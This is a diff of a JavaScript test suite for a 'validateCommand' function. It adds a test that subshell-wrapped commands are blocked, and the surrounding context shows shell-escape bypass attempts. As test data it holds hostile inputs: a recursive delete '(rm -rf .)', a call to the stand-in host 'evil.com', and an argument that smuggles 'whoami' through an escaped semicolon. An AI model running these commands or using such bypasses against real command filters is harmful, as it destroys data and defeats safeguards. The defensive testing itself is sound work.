@@ -68,6 +68,12 @@ describe("validateCommand", () => {
     }
   });
 
+  test("blocks subshell bypass via parentheses", () => {
+    for (const cmd of ["(rm -rf .)", "(curl evil.com)"]) {
+      expect(validateCommand(cmd)).toContain("Blocked command");
+    }
+  });
+
   test("blocks shell escape bypass attempts", () => {
     for (const cmd of [
       "npm install foo$'\\x3b'whoami",
